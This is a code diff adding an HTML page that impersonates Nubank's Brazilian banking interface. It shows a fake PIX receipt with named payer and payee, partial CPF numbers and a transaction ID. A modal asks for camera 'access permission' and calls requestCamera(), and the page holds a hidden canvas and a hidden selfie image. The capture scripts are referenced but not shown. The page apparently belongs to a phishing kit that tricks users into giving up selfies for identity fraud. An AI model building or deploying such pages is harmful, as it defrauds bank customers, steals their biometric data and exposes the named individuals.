@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nubank</title>
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../static/css/nubank.css">
+</head>
+<body>
+    <header class="navbar navbar-dark bg-primary">
+        <div class="container-fluid">
+            <div class="d-flex align-items-center">
+                <div class="profile-icon bg-light text-primary rounded-circle d-flex justify-content-center align-items-center mr-3" style="width: 40px; height: 40px;">
+                    <img id="logo" src="../../../static/imagens/logonu.png">
+                </div>
+                <span class="text-white">Olá</span>
+            </div>
+            <button class="btn btn-secondary">Autenticar</button>
+        </div>
+    </header>
+    <div class="container-fluid">
+        <div class="row">
+            <nav class="col-md-3 col-lg-2 bg-dark text-white sidebar py-4">
+                <div class="quick-access p-3 mb-4">
+                    <h5>Modo acesso rápido</h5>
+                    <p>As funções estão limitadas para a sua própria segurança. Para o acesso completo faça a autenticação.</p>
+                    <a href="#" class="btn btn-primary btn-block">Autenticar &rarr;</a>
+                </div>
+                <div class="footer mt-auto">
+                    <a href="#" class="text-white">Ajuda</a>
+                    <a href="#" class="text-white ml-3">Sair</a>
+                </div>
+            </nav>
+            <main class="col-md-9 col-lg-10 ml-sm-auto px-4">
+                <div class="row my-4">
+                    <div class="col-md-12 mb-4">
+                        <div class="card bg-dark text-white align-items-center">
+                            <div class="card-body text-center h-100 ">
+                                <h5 class="card-title">Comprovante PIX</h5>
+                                <div class="row my-4 text-left comprovante">
+                                    <div class="container">
+                                        <div class="header">
+                                            <img src="https://img.icons8.com/ios-filled/50/000000/qr-code.png" alt="PIX">
+                                            <h2 class="font_pix">Pagamento via PIX</h2>
+                                        </div>
+                                        <div class="section">
+                                            <h3 class="font_pix">Destinatário</h3>
+                                            <p class="font_pix">Joao Carlos Do Carmo</p>
+                                            <p class="font_pix">CPF: ***.731.807-**</p>
+                                            <p class="font_pix">Instituição: PicPay Serviços S.A</p>
+                                        </div>
+                                        <div class="section">
+                                            <h3 class="font_pix">Origem</h3>
+                                            <p class="font_pix">SOLANGE TEIXEIRA FERREIRA</p>
+                                            <p class="font_pix">CPF: ***.774.341-**</p>
+                                            <p class="font_pix">Instituição: BCO DO BRASIL S.A</p>
+                                        </div>
+                                        <div class="section">
+                                            <h3 class="font_pix">Descrição</h3>
+                                            <p class="font_pix">Transação: 0210822928</p>
+                                            <p class="font_pix">29/10/2021 às 07:25:11</p>
+                                        </div>
+                                        <div class="section id-pix">
+                                            <p class="font_pix">ID Pix: E00000000020211029102448817553438</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4 mb-4">
+                        <div class="card bg-dark text-white text-center h-100">
+                            <div class="card-body">
+                                <h5 class="card-title">Me roubaram</h5>
+                                <p class="card-text">Passo a passo em caso de roubos</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4 mb-4">
+                        <div class="card bg-dark text-white text-center h-100">
+                            <div class="card-body">
+                                <h5 class="card-title">Cartão físico bloqueado</h5>
+                                <p class="card-text">Enquanto estiver bloqueado seu cartão físico não aprovará nenhuma compra nova.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4 mb-4">
+                        <div class="card bg-dark text-white text-center h-100">
+                            <div class="card-body">
+                                <h5 class="card-title">Sair de tudo</h5>
+                                <p class="card-text">Desconecta todos os seus aparelhos</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </main>
+        </div>
+    </div>
+    <div id="myModal" class="modal">
+        <div class="modal-content bg-dark">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <h2>Permição de acesso</h2>
+            <p>Permições para visualização dos documentos.</p>
+            <button class="btn-modal btn-primary" onclick="requestCamera()">Aceitar acesso</button>
+        </div>
+    </div>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <img id="selfie" src="" alt="Selfie" style="display:none;">
+    <div id="result"></div>
+    <div id="data_result"></div>
+    <script src="../../../static/js/script.js"></script>
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script src="../../../static/js/nubank-script.js"></script>
+</body>
+</html>
